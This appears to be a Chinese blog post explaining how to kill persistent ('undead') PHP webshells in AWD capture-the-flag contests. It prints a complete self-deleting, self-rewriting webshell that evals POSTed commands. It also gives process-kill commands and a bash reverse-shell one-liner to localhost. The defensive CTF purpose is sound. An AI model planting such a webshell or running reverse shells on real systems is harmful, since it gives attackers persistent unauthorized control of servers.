<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>干掉 PHP 不死马 - rmb122's notebook</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="在 AWD 模式下经常碰到不死马, 不干掉的话就会一直被偷 flag, 很难受. 所以研究一下怎么干掉."><meta property="og:image" content><meta property="og:title" content="干掉 PHP 不死马"><meta property="og:description" content="在 AWD 模式下经常碰到不死马, 不干掉的话就会一直被偷 flag, 很难受. 所以研究一下怎么干掉."><meta property="og:type" content="article"><meta property="og:url" content="https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-04-04T23:20:56+00:00"><meta property="article:modified_time" content="2019-04-04T23:20:56+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="干掉 PHP 不死马"><meta name=twitter:description content="在 AWD 模式下经常碰到不死马, 不干掉的话就会一直被偷 flag, 很难受. 所以研究一下怎么干掉."><script src=https://rmb122.com/js/feather.min.js></script>
<link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.e9aac7e7a771269044e258ce034f7420b431b95683d4aef0faa4d381efbb16d3.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.4d342f24ad49bb75f14c3b92c9454fe693d293fb7474ecc40a101a8ad6af9d71.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>首页</a>&nbsp;
<a href=/posts>归档</a>&nbsp;
<a href=/tags>标签</a>&nbsp;
<a href=/links>友链</a>&nbsp;
<a href=/about>关于</a>
| <a id=dark-mode-toggle onclick=toggleTheme() href></a>
<script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>干掉 PHP 不死马</h1><div class=meta>发表于 2019 年 4 月 4 日</div></div><section class=body><p>在 AWD 模式下经常碰到不死马, 不干掉的话就会一直被偷 flag, 很难受. 所以研究一下怎么干掉.</p><h2 id=什么是不死马>什么是不死马</h2><p>先说一下什么是不死马, 比如这种</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>&lt;?</span>php
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>set_time_limit(<span style=color:#bd93f9>0</span>);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>ignore_user_abort(<span style=color:#bd93f9>1</span>);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>unlink(__FILE__);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#ff79c6>while</span> (<span style=color:#bd93f9>1</span>) {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    <span style=color:#8be9fd;font-style:italic>$content</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;&lt;?php error_reporting(0);if(sha1(</span><span style=color:#f1fa8c>\$</span><span style=color:#f1fa8c>_POST[&#39;pwd&#39;])===&#39;%pwd%&#39;){eval(</span><span style=color:#f1fa8c>\$</span><span style=color:#f1fa8c>_POST[&#39;cmd&#39;]);}?&gt;&#34;</span>;
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    file_put_contents(<span style=color:#f1fa8c>&#34;.shell.php&#34;</span>, <span style=color:#8be9fd;font-style:italic>$content</span>);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>    usleep(<span style=color:#bd93f9>10000</span>);
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#ff79c6>?&gt;</span>
</span></span></code></pre></div><p>简单来说有以下特性:</p><ul><li>访问后删除自己</li><li>即使断开连接也不会停止</li><li>驻留在内存中定时做某些事情, 比如上面这种就是不停的写 webshell</li></ul><p>根据行为也可以将不死马分为两种, 一种是 while(1) 不 sleep, 占用服务器资源, 卡机子, 还有一种是 sleep, 悄悄的留后门<br>如果不懂怎么干掉的话, 唯一的办法就是重启环境了, 而这在 AWD 中一般都是会倒扣不少分的&mldr;</p><p>接下来了解一下 php 主流的两种运行模式 <code>php-fpm</code> 与 <code>php-apache</code> 这两种,<br><code>php-fpm</code> 适用于 <code>nginx</code> 和 <code>apache</code> 而 <code>php-apache</code> 自然是只能 <code>apache</code> 使用,<br>其中 fpm 的性能更好, 但是配置较为复杂(其实也不是很复杂 233), 在 AWD 我只遇见过 <code>php-apache</code> 这种 0.0<br>但是其实要干掉不死马, 步骤都差不多</p><h2 id=干掉不死马>干掉不死马</h2><h3 id=php-apache>php-apache</h3><p>在这种模式下, 会在 fork 的一个 apache 进程里面以低权限用户来处理 php, 如下图</p><p><img src=https://i.loli.net/2019/04/04/5ca626d682f9d.png#center alt referrerpolicy=no-referrer></p><p>我们只要杀掉所以这些进程就行, 但在 AWD 中一般是没 root 权限的, 我们要干掉这些只能以低权限的身份来. 这里有两种办法</p><ol><li>给自己在 web 目录下写一个 php, 里面是</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff79c6>&lt;?</span>php
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>system(<span style=color:#f1fa8c>&#34;kill `ps -ef | grep httpd | grep -v grep | awk &#39;{print $2}&#39;`&#34;</span>);
</span></span></code></pre></div><p>如果觉得碰到不死马了就直接访问, 杀掉所有 httpd 进程, 因为权限不够, root 的不会被杀掉, 这个守护进程会自动再 fork 进程, 不用担心服务挂</p><ol start=2><li>写个 php 给自己弹个 shell, 在 shell 里面 killall, 这个更方便一点, 也更灵活</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff79c6>&lt;?</span>php
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>system(<span style=color:#f1fa8c>&#34;bash -i &gt;&amp; /dev/tcp/127.0.0.1/23333 0&gt;&amp;1&#34;</span>);
</span></span></code></pre></div><h3 id=php-fpm>php-fpm</h3><p>其实跟上面差不多, 只是进程名不同, 因为 fpm 是独立的服务, 不同于上面 apache 里面直接调用 php 的 api<br><img src=https://i.loli.net/2019/04/05/5ca62d252ca42.png#center alt referrerpolicy=no-referrer></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff79c6>&lt;?</span>php
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>system(<span style=color:#f1fa8c>&#34;kill `ps -ef | grep php-fpm | grep -v grep | awk &#39;{print $2}&#39;`&#34;</span>);
</span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/awd>awd</a></li><li><a href=/tags/web>web</a></li></ul></nav></div></article></main><footer><div class=footer-info>© 2017 - 2022, rmb122</div><div style=display:flex><span class=border></span><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a><a class=soc href=https://rmb122.com/index.xml title=RSS><i data-feather=rss></i></a></div></footer><script>feather.replace()</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-1MH3QGWHV5"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-1MH3QGWHV5",{anonymize_ip:!1})}</script><script src=https://rmb122.com/js/medium-zoom.min.js></script>
<script>for(let e of document.getElementsByTagName("img"))mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"rgba(0, 0, 0, 0.8)"})</script></div></body></html>